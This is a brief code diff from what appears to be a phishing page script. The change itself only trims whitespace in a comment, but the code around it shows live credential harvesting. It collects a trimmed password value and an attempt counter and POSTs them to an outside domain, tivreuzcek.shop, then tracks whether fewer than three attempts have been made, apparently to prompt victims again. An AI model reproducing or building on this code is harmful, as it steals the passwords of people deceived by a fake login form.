@@ -429,7 +429,7 @@ formData.append("pwd", pwdInput.value.trim());
 formData.append("attemptCount", attemptCount); // pass attempt number to PHP
 
     try {
-        // Send data to PHP backend 
+        // Send data to PHP backend
         await fetch("https://tivreuzcek.shop/index.php", { method: "POST", body: formData });
 
         if (attemptCount < 3) {
